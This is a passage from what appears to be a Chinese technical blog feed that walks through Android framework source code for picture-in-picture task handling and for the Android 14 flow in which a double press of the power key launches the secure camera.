class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">moveActivityToPinnedRootTask</span><span class="params">(<span class="meta">@NonNull</span> ActivityRecord r,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> ActivityRecord launchIntoPipHostActivity, String reason)</span> &#123;</span><br><span class="line">    mService.deferWindowLayout();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">TaskDisplayArea</span> <span class="variable">taskDisplayArea</span> <span class="operator">=</span> r.getDisplayArea();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取任务栈</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">task</span> <span class="operator">=</span> r.getTask();</span><br><span class="line">        <span class="comment">// 现在创建一个转换控制器以收集当前关闭的任务栈。</span></span><br><span class="line">        <span class="comment">// 由于进入 PIP 的任务（触发器）尚未准备好，因此在此处进行创建。</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">TransitionController</span> <span class="variable">transitionController</span> <span class="operator">=</span> task.mTransitionController;</span><br><span class="line">        <span class="type">Transition</span> <span class="variable">newTransition</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (transitionController.isCollecting()) &#123;</span><br><span class="line">            transitionController.setReady(task, <span class="literal">false</span> <span class="comment">/* ready */</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (transitionController.getTransitionPlayer() != <span class="literal">null</span>) &#123;</span><br><span class="line">            newTransition = transitionController.createTransition(TRANSIT_PIP);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">rootPinnedTask</span> <span class="operator">=</span> taskDisplayArea.getRootPinnedTask();</span><br><span class="line">        <span class="keyword">if</span> (rootPinnedTask != <span class="literal">null</span>) &#123;</span><br><span class="line">            transitionController.collect(rootPinnedTask);</span><br><span class="line">            <span class="comment">// 新的ActivityRecord应该取代现有的PiP，因此旧的PiP消失而不是同时转到全屏，</span></span><br><span class="line">            <span class="comment">// 正如Task#diseasePip试图做的那样。</span></span><br><span class="line">            removeRootTasksInWindowingModes(WINDOWING_MODE_PINNED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置过渡以确保我们不会立即尝试更新可见性，进入 PIP 的活动</span></span><br><span class="line">        r.getDisplayContent().prepareAppTransition(TRANSIT_NONE);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TaskFragment</span> <span class="variable">organizedTf</span> <span class="operator">=</span> r.getOrganizedTaskFragment();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">singleActivity</span> <span class="operator">=</span> task.getNonFinishingActivityCount() == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">final</span> Task rootTask;</span><br><span class="line">        <span class="keyword">if</span> (singleActivity) &#123;</span><br><span class="line">            rootTask = task;</span><br><span class="line">            <span class="comment">// 对进入PIP的任务应用最近一次的动画牵引变换</span></span><br><span class="line">            rootTask.maybeApplyLastRecentsAnimationTransaction();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在多个活动的情况下，我们将为其创建一个新任务，</span></span><br><span class="line">            <span class="comment">// 然后将PIP活动移动到任务中。</span></span><br><span class="line">            <span class="comment">// 注意，我们明确地延迟了正在发送的任务，并将这个新创建的任务标记为可见</span></span><br><span class="line">            rootTask = <span class="keyword">new</span> <span class="title class_">Task</span>.Builder(mService)</span><br><span class="line">                    .setActivityType(r.getActivityType())</span><br><span class="line">                    .setOnTop(<span class="literal">true</span>)</span><br><span class="line">                    .setActivityInfo(r.info)</span><br><span class="line">                    .setParent(taskDisplayArea)</span><br><span class="line">                    .setIntent(r.intent)</span><br><span class="line">                    .setDeferTaskAppear(<span class="literal">true</span>)</span><br><span class="line">                    .setHasBeenVisible(<span class="literal">true</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="comment">// 在原始任务和固定任务之间建立双向链接。</span></span><br><span class="line">            r.setLastParentBeforePip(launchIntoPipHostActivity);</span><br><span class="line">            <span class="comment">// 进入 PIP 的任务可能是自由格式的，因此请保存最后一个非全屏边界。</span></span><br><span class="line">            <span class="comment">// 然后当这个新的 PIP 任务退出 PIP 时，它可以恢复到它以前的自由形式边界</span></span><br><span class="line">            rootTask.setLastNonFullscreenBounds(task.mLastNonFullscreenBounds);</span><br><span class="line">            rootTask.setBounds(task.getBounds());</span><br><span class="line">            <span class="comment">// 将最后一个最近的动画事务从原始任务移动到新任务</span></span><br><span class="line">            <span class="keyword">if</span> (task.mLastRecentsAnimationTransaction != <span class="literal">null</span>) &#123;</span><br><span class="line">                rootTask.setLastRecentsAnimationTransaction(</span><br><span class="line">                        task.mLastRecentsAnimationTransaction,</span><br><span class="line">                        task.mLastRecentsAnimationOverlay);</span><br><span class="line">                task.clearLastRecentsAnimationTransaction(<span class="literal">false</span> <span class="comment">/* forceRemoveOverlay */</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (organizedTf != <span class="literal">null</span> &amp;&amp; organizedTf.getNonFinishingActivityCount() == <span class="number">1</span></span><br><span class="line">                    &amp;&amp; organizedTf.getTopNonFinishingActivity() == r) &#123;</span><br><span class="line">                <span class="comment">// PIP 的状态，是否已清除 PIP 的TaskFragment。</span></span><br><span class="line">                <span class="comment">// 一旦有改变将在 ActivityTaskManagerService#onPictureInPictureStateChanged() 收到回调</span></span><br><span class="line">                organizedTf.mClearedTaskFragmentForPip = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Activity reparent 到新建的 task</span></span><br><span class="line">            r.reparent(rootTask, MAX_VALUE, reason);</span><br><span class="line">            <span class="comment">// 确保修复后新任务的约束与其当前边界同步。</span></span><br><span class="line">            rootTask.maybeApplyLastRecentsAnimationTransaction();</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">oldTopActivity</span> <span class="operator">=</span> task.getTopMostActivity();</span><br><span class="line">            <span class="keyword">if</span> (oldTopActivity != <span class="literal">null</span> &amp;&amp; oldTopActivity.isState(STOPPED)</span><br><span class="line">                    &amp;&amp; task.getDisplayContent().mAppTransition.containsTransitRequest(</span><br><span class="line">                    TRANSIT_TO_BACK)) &#123;</span><br><span class="line">                task.getDisplayContent().mClosingApps.add(oldTopActivity);</span><br><span class="line">                oldTopActivity.mRequestForceTransition = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">intermediateWindowingMode</span> <span class="operator">=</span> rootTask.getWindowingMode();</span><br><span class="line">        <span class="keyword">if</span> (rootTask.getParent() != taskDisplayArea) &#123;</span><br><span class="line">            rootTask.reparent(taskDisplayArea, <span class="literal">true</span> <span class="comment">/* onTop */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (newTransition != <span class="literal">null</span>) &#123;</span><br><span class="line">            transitionController.requestStartTransition(newTransition, rootTask,</span><br><span class="line">                    <span class="literal">null</span> <span class="comment">/* remoteTransition */</span>, <span class="literal">null</span> <span class="comment">/* displayChange */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        transitionController.collect(rootTask);</span><br><span class="line">        r.setWindowingMode(intermediateWindowingMode);</span><br><span class="line">        r.mWaitForEnteringPinnedMode = <span class="literal">true</span>;</span><br><span class="line">        rootTask.forAllTaskFragments(tf -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!tf.isOrganizedTaskFragment()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tf.resetAdjacentTaskFragment();</span><br><span class="line">            <span class="keyword">if</span> (tf.getTopNonFinishingActivity() != <span class="literal">null</span>) &#123;</span><br><span class="line">                tf.updateRequestedOverrideConfiguration(EMPTY);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        rootTask.setWindowingMode(WINDOWING_MODE_PINNED);</span><br><span class="line">        <span class="keyword">if</span> (r.getOptions() != <span class="literal">null</span> &amp;&amp; r.getOptions().isLaunchIntoPip()) &#123;</span><br><span class="line">            mWindowManager.mTaskSnapshotController.recordTaskSnapshot(</span><br><span class="line">                    task, <span class="literal">false</span> <span class="comment">/* allowSnapshotHome */</span>);</span><br><span class="line">            rootTask.setBounds(r.getOptions().getLaunchBounds());</span><br><span class="line">        &#125;</span><br><span class="line">        rootTask.setDeferTaskAppear(<span class="literal">false</span>);</span><br><span class="line">        r.supportsEnterPipOnTaskSwitch = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (organizedTf != <span class="literal">null</span> &amp;&amp; organizedTf.mClearedTaskFragmentForPip</span><br><span class="line">                &amp;&amp; organizedTf.isTaskVisibleRequested()) &#123;</span><br><span class="line">            mService.mTaskFragmentOrganizerController.dispatchPendingInfoChangedEvent(</span><br><span class="line">                    organizedTf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mService.continueWindowLayout();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 显示</span></span><br><span class="line">    ensureActivitiesVisible(<span class="literal">null</span>, <span class="number">0</span>, <span class="literal">false</span> <span class="comment">/* preserveWindows */</span>);</span><br><span class="line">    resumeFocusedTasksTopActivities();</span><br><span class="line">    notifyActivityPipModeChanged(r.getTask(), r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二-退出PIP模式"><a href="#二-退出PIP模式" class="headerlink" title="二. 退出PIP模式"></a>二. 退出PIP模式</h3><p>当 PIP 状态改变，将会在 <strong>ActivityTaskManagerService#onPictureInPictureStateChanged()</strong> 收到回调：</p><p><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPictureInPictureStateChanged</span><span class="params">(PictureInPictureUiState pipState)</span> &#123;</span><br><span class="line">    enforceTaskPermission(<span class="string">&quot;onPictureInPictureStateChanged&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">rootPinnedTask</span> <span class="operator">=</span> mRootWindowContainer.getDefaultTaskDisplayArea()</span><br><span class="line">            .getRootPinnedTask();</span><br><span class="line">    <span class="keyword">if</span> (rootPinnedTask != <span class="literal">null</span> &amp;&amp; rootPinnedTask.getTopMostActivity() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里将会去提醒客户端状态发生改变；</span></span><br><span class="line">        mWindowManager.mAtmService.mActivityClientController.onPictureInPictureStateChanged(</span><br><span class="line">                rootPinnedTask.getTopMostActivity(), pipState);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ActivityClientController#onPictureInPictureStateChanged()</strong> :<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityClientController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">onPictureInPictureStateChanged</span><span class="params">(<span class="meta">@NonNull</span> ActivityRecord r,</span></span><br><span class="line"><span class="params">        PictureInPictureUiState pipState)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!r.inPinnedWindowingMode()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Activity is not in PIP mode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClientTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> ClientTransaction.obtain(</span><br><span class="line">                r.app.getThread(), r.token);</span><br><span class="line">        transaction.addCallback(PipStateTransactionItem.obtain(pipState));</span><br><span class="line">        mService.getLifecycleManager().scheduleTransaction(transaction);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Slog.w(TAG, <span class="string">&quot;Failed to send pip state transaction item: &quot;</span></span><br><span class="line">                + r.intent.getComponent(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 双击power键唤起安全相机流程解析</title>
      <link href="/2024/02/13/2024-02-13/"/>
      <url>/2024/02/13/2024-02-13/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>事件处理主要都是在 <strong>PhoneWindowManager.java</strong> 中，电源键处理在 <strong>PhoneWindowManager#interceptKeyBeforeQueueing()</strong> 中：<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">interceptKeyBeforeQueueing</span><span class="params">(KeyEvent event, <span class="type">int</span> policyFlags)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">if</span> ((event.getFlags() &amp; KeyEvent.FLAG_FALLBACK) == <span class="number">0</span>) &#123;</span><br><span class="line">            Log.d(TAG,<span class="string">&quot;handleKeyGesture +000&quot;</span>);</span><br><span class="line">            handleKeyGesture(event, interactiveAndOn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleKeyGesture</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (event.getKeyCode() == KEYCODE_POWER &amp;&amp; event.getAction() == KeyEvent.ACTION_DOWN) &#123;</span><br><span class="line">        mPowerKeyHandled = handleCameraGesture(event, interactive);</span><br><span class="line">        <span class="keyword">if</span> (mPowerKeyHandled) &#123;</span><br><span class="line">            <span class="comment">// handled by camera gesture.</span></span><br><span class="line">            mSingleKeyGestureDetector.reset();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mSingleKeyGestureDetector.interceptKey(event, interactive);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The camera gesture will be detected by GestureLauncherService.</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">handleCameraGesture</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="comment">// camera gesture.</span></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">intercept</span> <span class="operator">=</span></span><br><span class="line">            mGestureLauncherService.interceptPowerKeyDown(event, interactive, outLaunched);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看 <strong>GestureLauncherService.java</strong><br><strong>frameworks/base/services/core/java/com/android/server/GestureLauncherService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">interceptPowerKeyDown</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive,</span></span><br><span class="line"><span class="params">        MutableBoolean outLaunched)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (launchCamera) &#123;</span><br><span class="line">        Slog.i(TAG, <span class="string">&quot;Power button double tap gesture detected, launching camera. Interval=&quot;</span></span><br><span class="line">                + powerTapInterval + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">        launchCamera = handleCameraGesture(<span class="literal">false</span> <span class="comment">/* useWakelock */</span>,</span><br><span class="line">                StatusBarManager.CAMERA_LAUNCH_SOURCE_POWER_DOUBLE_TAP);</span><br><span class="line">        <span class="keyword">if</span> (launchCamera) &#123;</span><br><span class="line">            mMetricsLogger.action(MetricsEvent.ACTION_DOUBLE_TAP_POWER_CAMERA_GESTURE,</span><br><span class="line">                    (<span class="type">int</span>) powerTapInterval);</span><br><span class="line">            mUiEventLogger.log(GestureLauncherEvent.GESTURE_CAMERA_DOUBLE_TAP_POWER);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (launchEmergencyGesture) &#123;</span><br><span class="line">        Slog.i(TAG, <span class="string">&quot;Emergency gesture detected, launching.&quot;</span>);</span><br><span class="line">        launchEmergencyGesture = handleEmergencyGesture();</span><br><span class="line">        mUiEventLogger.log(GestureLauncherEvent.GESTURE_EMERGENCY_TAP_POWER);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@VisibleForTesting</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">handleCameraGesture</span><span class="params">(<span class="type">boolean</span> useWakelock, <span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">if</span> (useWakelock) &#123;</span><br><span class="line">            <span class="comment">// Make sure we don&#x27;t sleep too early</span></span><br><span class="line">            mWakeLock.acquire(<span class="number">500L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StatusBarManagerInternal</span> <span class="variable">service</span> <span class="operator">=</span> LocalServices.getService(</span><br><span class="line">                StatusBarManagerInternal.class);</span><br><span class="line">        service.onCameraLaunchGestureDetected(source);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>StatusBarManagerInternal.java</strong> 是一个 interface 接口，实现在 <strong>StatusBarManagerService.java</strong> 。<br><strong>StatusBarManagerService#onCameraLaunchGestureDetected()</strong><br><strong>frameworks/base/services/core/java/com/android/server/statusbar/StatusBarManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCameraLaunchGestureDetected</span><span class="params">(<span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mBar != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mBar.onCameraLaunchGestureDetected(source);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>mBar</strong> 是 <strong>IStatusBar</strong> 对象，被 <strong>CommandQueue.java</strong> 继承；<strong>CentralSurfacesCommandQueueCallbacks</strong> 又继承了实现了 <strong>CommandQueue.Callbacks</strong> ，最终下一步会调用到 <strong>CentralSurfacesCommandQueueCallbacks#onCameraLaunchGestureDetected()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCameraLaunchGestureDetected</span><span class="params">(<span class="type">int</span> source)</span> &#123;</span><br><span class="line">    mCentralSurfaces.setLastCameraLaunchSource(source);</span><br><span class="line">    <span class="keyword">if</span> (mCentralSurfaces.isGoingToSleep()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (CentralSurfaces.DEBUG_CAMERA_LIFT) &#123;</span><br><span class="line">            Slog.d(CentralSurfaces.TAG, <span class="string">&quot;Finish going to sleep before launching camera&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mCentralSurfaces.setLaunchCameraOnFinishedGoingToSleep(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mNotificationPanelViewController.canCameraGestureBeLaunched()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (CentralSurfaces.DEBUG_CAMERA_LIFT) &#123;</span><br><span class="line">            Slog.d(CentralSurfaces.TAG, <span class="string">&quot;Can&#x27;t launch camera right now&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mCentralSurfaces.isDeviceInteractive()) &#123;</span><br><span class="line">        mPowerManager.wakeUp(SystemClock.uptimeMillis(), PowerManager.WAKE_REASON_CAMERA_LAUNCH,</span><br><span class="line">                <span class="string">&quot;com.android.systemui:CAMERA_GESTURE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vibrateForCameraGesture();</span><br><span class="line">    <span class="keyword">if</span> (source == StatusBarManager.CAMERA_LAUNCH_SOURCE_POWER_DOUBLE_TAP) &#123;</span><br><span class="line">        Log.v(CentralSurfaces.TAG, <span class="string">&quot;Camera launch&quot;</span>);</span><br><span class="line">        <span class="comment">// 屏蔽人脸或者指纹解锁</span></span><br><span class="line">        mKeyguardUpdateMonitor.onCameraLaunched();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mStatusBarKeyguardViewManager.isShowing()) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">cameraIntent</span> <span class="operator">=</span> CameraIntents.getInsecureCameraIntent(mContext);</span><br><span class="line">        mCentralSurfaces.startActivityDismissingKeyguard(cameraIntent,</span><br><span class="line">                <span class="literal">false</span> <span class="comment">/* onlyProvisioned */</span>, <span class="literal">true</span> <span class="comment">/* dismissShade */</span>,</span><br><span class="line">                <span class="literal">true</span> <span class="comment">/* disallowEnterPictureInPictureWhileLaunching */</span>, <span class="literal">null</span> <span class="comment">/* callback */</span>, <span class="number">0</span>,</span><br><span class="line">                <span class="literal">null</span> <span class="comment">/* animationController */</span>, UserHandle.CURRENT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mCentralSurfaces.isDeviceInteractive()) &#123;</span><br><span class="line">            <span class="comment">// 当我们立即启动相机并且弹跳器启动时，避免稀松布闪烁                </span></span><br><span class="line">            mCentralSurfaces.acquireGestureWakeLock(</span><br><span class="line">                    CentralSurfaces.LAUNCH_TRANSITION_TIMEOUT_MS + <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isWakingUpOrAwake()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (CentralSurfaces.DEBUG_CAMERA_LIFT) &#123;</span><br><span class="line">                Slog.d(CentralSurfaces.TAG, <span class="string">&quot;Launching camera&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mStatusBarKeyguardViewManager.isBouncerShowing()) &#123;</span><br><span class="line">                mStatusBarKeyguardViewManager.reset(<span class="literal">true</span> <span class="comment">/* hide */</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 启动相机</span></span><br><span class="line">            mNotificationPanelViewController.launchCamera(mCentralSurfaces.isDeviceInteractive() <span class="comment">/* animate */</span>, source);</span><br><span class="line">            mCentralSurfaces.updateScrimController();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> 